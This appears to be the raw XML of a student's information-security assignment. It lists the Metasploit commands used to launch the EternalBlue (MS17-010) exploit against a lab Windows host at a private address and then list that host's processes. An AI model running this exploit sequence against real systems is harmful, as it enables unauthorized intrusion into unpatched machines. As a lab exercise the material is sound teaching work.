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ADA2E7" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRPr="00E83B60" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E83B60">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>COMP 421 - Information Security Assignment 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BF76AB" w14:textId="3F46687A" w:rsidR="00E83B60" w:rsidRDefault="00000000" w:rsidP="00E83B60">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E83B60">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Fall 2024 - Section B</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564FCF20" w14:textId="77777777" w:rsidR="00E83B60" w:rsidRPr="00E83B60" w:rsidRDefault="00E83B60" w:rsidP="00E83B60"/>
    <w:p w14:paraId="6FC0F3F2" w14:textId="227B07ED" w:rsidR="00C519B4" w:rsidRDefault="00E83B60">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Kiran Qaiser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CC70C11" w14:textId="1EAAAA6B" w:rsidR="00E83B60" w:rsidRPr="00E83B60" w:rsidRDefault="00E83B60">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>251683919</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585B7B15" w14:textId="33834E24" w:rsidR="00C519B4" w:rsidRPr="00E83B60" w:rsidRDefault="00E83B60" w:rsidP="00E83B60">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E83B60">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
        <w:t>Problem statement:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6C0E77" w14:textId="65A36DD5" w:rsidR="00E83B60" w:rsidRDefault="00000000">
      <w:r>
        <w:t>In this assignment, you are required to get the list of all the running processes on the target system. For this purpose, you can use auxiliary, exploit, and post-exploit modules of the Metasploit Framework.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BD22D9" w14:textId="1C042245" w:rsidR="00E83B60" w:rsidRPr="00E83B60" w:rsidRDefault="00E83B60">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E83B60">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Command Used:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DBC1AF" w14:textId="0873E24C" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. Launch Metasploit Framework:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A23B80" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="489150C1" w14:textId="5B5E275A" w:rsidR="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00301ABE">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46189338" wp14:editId="59C6DF9E">
            <wp:extent cx="6344529" cy="3488690"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="379021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213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6999" cy="349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910B" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">2. Use the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>EternalBlue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> exploit module:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB609EB" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   use exploit/windows/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>smb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>/ms17_010_eternalblue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335E5F63" w14:textId="77777777" w:rsidR="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F84DE61" w14:textId="3677F77E" w:rsidR="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r w:rsidRPr="00301ABE">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D94AC91" wp14:editId="4EF56030">
            <wp:extent cx="6189345" cy="1600663"/>
            <wp:effectExtent l="0" t="0" r="1905" b="0"/>
            <wp:docPr id="103021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13345" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId7"/>
                    <a:srcRect t="33956"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6205348" cy="1604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75BAD" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:t>3. Set the target host and LHOST:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3074FDD9" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   set RHOSTS 10.0.2.9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133B4D5E" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   set LHOST 10.0.2.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2E0B45" w14:textId="7AA63D6A" w:rsidR="00301ABE" w:rsidRDefault="00B95EA3" w:rsidP="00301ABE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68F06C4" wp14:editId="6E1F91A7">
            <wp:extent cx="6273946" cy="926961"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="1721191859" name="Picture 1721191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30 21483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5390" cy="93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C0D9" w14:textId="174A8BBA" w:rsidR="00301ABE" w:rsidRPr="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r w:rsidRPr="00301ABE">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>Verify Exploit Settings</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">        show options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE5BB98" w14:textId="6CBA7F1F" w:rsidR="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14C65DCB" w14:textId="1908E454" w:rsidR="00301ABE" w:rsidRDefault="00301ABE">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="052C2B1C" wp14:editId="79235E8C">
            <wp:extent cx="6506308" cy="2200772"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="815914561" name="Picture 8159145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14561" name="Picture 81591456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1943" cy="221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D953" w14:textId="7509D1E6" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:t>4. Execute the exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45853E9C" w14:textId="6C4F22BB" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00301ABE">
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>xploit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAF6F08" w14:textId="47A067C0" w:rsidR="00301ABE" w:rsidRDefault="00301ABE" w:rsidP="00301ABE">
      <w:pPr>
        <w:pStyle w:val="ListBullet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6FB91753" wp14:editId="0B3FAF3B">
            <wp:extent cx="5683204" cy="3474720"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2094458178" name="Picture 2094458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30 21481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4509" cy="348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D15F" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:t>5. List processes on the target system:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10CFF62B" w14:textId="58BF7BB6" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00441DF0">
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="712F7545" w14:textId="4687D075" w:rsidR="00B95EA3" w:rsidRDefault="00B95EA3" w:rsidP="00B95EA3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354F676" wp14:editId="38603E49">
            <wp:extent cx="5798722" cy="2996906"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="500463812" name="Picture 5004638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63812" name="Picture 500463812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4979" cy="300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EF0A" w14:textId="77777777" w:rsidR="00B95EA3" w:rsidRDefault="00B95EA3" w:rsidP="00B95EA3">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D7D33B6" w14:textId="77777777" w:rsidR="00323EBD" w:rsidRDefault="00323EBD" w:rsidP="00323EBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:firstLine="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5066F5C5" w14:textId="77777777" w:rsidR="00323EBD" w:rsidRDefault="00323EBD" w:rsidP="00323EBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:firstLine="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33AE17CE" w14:textId="77777777" w:rsidR="00323EBD" w:rsidRDefault="00323EBD" w:rsidP="00323EBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:firstLine="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AF5462B" w14:textId="77777777" w:rsidR="00323EBD" w:rsidRDefault="00323EBD" w:rsidP="00323EBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:firstLine="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="560CA709" w14:textId="38D4134D" w:rsidR="00B95EA3" w:rsidRDefault="00B95EA3" w:rsidP="00323EBD">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:firstLine="360"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6. Target System:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639278AB" w14:textId="7715A938" w:rsidR="00C519B4" w:rsidRDefault="00B95EA3" w:rsidP="00B95EA3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DA5109B" wp14:editId="607ADCE1">
            <wp:extent cx="5029200" cy="4085519"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="665227570" name="Picture 665227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30 21480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8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303C" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A966519" wp14:editId="06B15158">
            <wp:extent cx="5029200" cy="1898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30 21475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27CB" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="2A5A60DA" w14:textId="1509CD98" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="68425752" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="541CD39B" w14:textId="1AE1BE78" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="70EED3F2" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="1545E7AC" w14:textId="6154CD7F" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="35D57598" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="590D2654" w14:textId="0D5C5B0E" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="688443BF" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="3527F16C" w14:textId="2B1DDA5D" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="58657973" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="47F119FA" w14:textId="334EF70E" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="077E6690" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="17315484" w14:textId="7768A2AF" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="5A841A40" w14:textId="77777777" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:p w14:paraId="18F00256" w14:textId="0436022C" w:rsidR="00C519B4" w:rsidRDefault="00C519B4"/>
    <w:sectPr w:rsidR="00C519B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8280881">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="72093995">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1603300127">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="307638202">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1034308853">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="489906848">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1365599930">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1220627111">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1605922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01ABE"/>
    <w:rsid w:val="00323EBD"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00441DF0"/>
    <w:rsid w:val="005057B8"/>
    <w:rsid w:val="00A123E0"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B95EA3"/>
    <w:rsid w:val="00C519B4"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E83B6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3DBD5B2"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{F50CD378-D70A-4F4A-B1CD-A60B5D038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301A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299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730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Kiran Qaiser</cp:lastModifiedBy>
  <cp:revision>6</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-11-30T17:28:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>